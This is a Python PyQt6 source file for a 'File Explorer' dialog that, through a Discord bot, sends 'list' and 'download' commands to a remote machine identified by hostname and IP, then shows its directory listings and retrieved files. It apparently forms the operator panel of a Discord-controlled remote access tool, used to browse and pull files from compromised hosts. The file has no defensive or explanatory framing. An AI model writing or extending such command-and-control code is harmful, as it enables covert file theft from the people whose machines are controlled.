from PyQt6.QtWidgets import (QDialog, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
                              QPushButton, QListWidget, QListWidgetItem)
from PyQt6.QtCore import Qt
import json
import os

class FileExplorerDialog(QDialog):
    def __init__(self, parent, hostname, ip, discord_bot):
        super().__init__(parent)
        self.setWindowTitle(f"File Explorer - {hostname} ({ip})")
        self.setMinimumSize(700, 500)
        self.hostname = hostname
        self.ip = ip
        self.discord_bot = discord_bot
        self.init_ui()
        self.register_callbacks()

    def init_ui(self):
        layout = QVBoxLayout(self)

        top = QHBoxLayout()
        self.path_input = QLineEdit()
        self.path_input.setPlaceholderText("Enter path to list (e.g., C:/Users)")
        top.addWidget(self.path_input)

        list_btn = QPushButton("List")
        list_btn.clicked.connect(self.request_list)
        top.addWidget(list_btn)

        layout.addLayout(top)

        self.list_widget = QListWidget()
        layout.addWidget(self.list_widget)

        btn_layout = QHBoxLayout()
        self.download_btn = QPushButton("Download Selected")
        self.download_btn.clicked.connect(self.download_selected)
        btn_layout.addWidget(self.download_btn)

        close_btn = QPushButton("Close")
        close_btn.clicked.connect(self.close)
        btn_layout.addWidget(close_btn)

        layout.addLayout(btn_layout)

    def register_callbacks(self):
        if not self.discord_bot:
            return
        # register to receive FILELIST messages
        try:
            self.discord_bot.register_filelist_callback(self.on_filelist)
        except Exception:
            pass
        try:
            self.discord_bot.register_file_download_callback(self.on_file_downloaded)
        except Exception:
            pass

    def request_list(self):
        path = self.path_input.text().strip() or '.'
        if not self.discord_bot:
            try:
                self.window().show_notification("Start the bot first", level='warn')
            except Exception:
                pass
            return
        if not self.discord_bot.is_ready():
            try:
                self.window().show_notification("Bot not ready yet", level='warn')
            except Exception:
                pass
            return
        success = self.discord_bot.send_command(self.ip, f"list {path}")
        if not success:
            try:
                self.window().show_notification("Failed to send list command", level='error')
            except Exception:
                pass

    def on_filelist(self, ip, json_payload):
        # Only accept payloads matching the dialog's ip
        if ip != self.ip:
            return
        try:
            data = json.loads(json_payload)
        except Exception:
            try:
                data = json.loads(json_payload.split(':',1)[1])
            except Exception:
                data = {'error': 'invalid payload'}
        self.list_widget.clear()
        if 'error' in data:
            self.list_widget.addItem(f"Error: {data.get('error')}")
            return
        items = data.get('items', [])
        for it in items:
            name = it.get('name')
            is_dir = it.get('is_dir')
            size = it.get('size', 0)
            display = f"[DIR] {name}" if is_dir else f"{name} ({size} bytes)"
            item = QListWidgetItem(display)
            item.setData(Qt.ItemDataRole.UserRole, name)
            self.list_widget.addItem(item)

    def download_selected(self):
        sel = self.list_widget.currentItem()
        if not sel:
            try:
                self.window().show_notification("Select a file to download", level='info')
            except Exception:
                pass
            return
        name = sel.data(Qt.ItemDataRole.UserRole)
        # Ask client to send file
        if not self.discord_bot or not self.discord_bot.is_ready():
            try:
                self.window().show_notification("Bot not ready", level='warn')
            except Exception:
                pass
            return
        # send download command
        success = self.discord_bot.send_command(self.ip, f"download {name}")
        if not success:
            try:
                self.window().show_notification("Failed to request file download", level='error')
            except Exception:
                pass
        else:
            try:
                self.window().show_notification(f"Requested download for {name}", level='info')
            except Exception:
                pass

    def on_file_downloaded(self, ip, local_path, filename):
        # Only handle files for our IP
        if ip and ip != self.ip:
            return
        # Notify user and show where file was saved
        try:
            if os.path.exists(local_path):
                try:
                    self.window().show_notification(f"Downloaded {filename} -> {local_path}", level='success', duration_ms=7000)
                except Exception:
                    pass
            else:
                try:
                    self.window().show_notification(f"{filename} available at {local_path}", level='success', duration_ms=7000)
                except Exception:
                    pass
        except Exception:
            pass
